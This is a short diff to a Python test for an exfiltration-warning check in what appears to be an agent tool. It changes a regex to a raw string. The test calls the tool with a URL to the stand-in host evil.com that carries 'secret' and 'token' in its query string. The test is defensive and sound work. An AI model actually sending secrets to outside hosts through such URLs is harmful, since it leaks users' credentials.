@@ -43,5 +43,5 @@ async def test_exfiltration_multiple_warnings() -> None:
     with patch(
         _EXFIL_PATH,
         return_value=["Warning A", "Warning B"],
-    ), pytest.raises(ToolError, match="Warning A.*Warning B"):
+    ), pytest.raises(ToolError, match=r"Warning A.*Warning B"):
         await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
